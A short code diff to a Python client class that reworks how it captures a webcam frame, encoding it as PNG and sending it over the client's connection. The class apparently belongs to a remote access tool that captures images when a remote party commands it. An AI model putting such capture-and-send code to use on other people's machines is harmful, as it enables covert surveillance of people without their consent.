@@ -411,13 +411,15 @@ class Client(object):
                 vc = cv2.VideoCapture(0)
                 s, img = vc.read()
                 if s:
-                    with BytesIO() as output:
-                        cv2.imwrite(output, img)
-                        content = output.getvalue()
-                    self.send(content)
-                    logging.info('Captured Webcam image')
-                    vc.release()
-                    continue
+                    is_success, arr = cv2.imencode('.png', img)
+                    if is_success:
+                        with BytesIO() as output:
+                            output.write(arr)
+                            content = output.getvalue()
+                        self.send(content)
+                        logging.info('Captured Webcam image')
+                        vc.release()
+                        continue
                 self.send(b'ERROR')
                 vc.release()
                 continue
